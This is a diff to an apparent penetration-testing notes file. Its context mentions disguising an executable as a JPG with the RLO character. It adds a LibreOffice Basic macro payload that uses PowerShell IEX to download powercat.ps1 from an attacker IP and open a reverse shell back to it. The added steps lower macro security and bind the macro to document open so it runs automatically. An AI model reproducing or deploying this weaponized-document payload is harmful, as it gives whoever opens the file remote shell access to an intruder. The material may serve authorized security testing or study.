@@ -123,3 +123,17 @@ ResourceHacker
 ### Use RLO change file extension from exe into jpg
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/01bc9bde-67d9-46ec-8776-6a29bec48bed)
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/3a1260b7-3772-45f6-9f7f-1ea501814662)
+
+### Libreoffice payload
+```
+REM  *****  BASIC  *****
+
+Sub Main
+
+	 Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.166:8000/powercat.ps1');powercat -c 192.168.45.166 -p 80 -e powershell")
+
+End Sub
+```
+Tools -> Options -> Security -> Macrosecurity -> Low
+Tools -> Customize -> OpenDocument -> Assign Macro
+Tools -> Macro -> Organize Macro -> Basic -> choose the file -> New -> NewModuleName
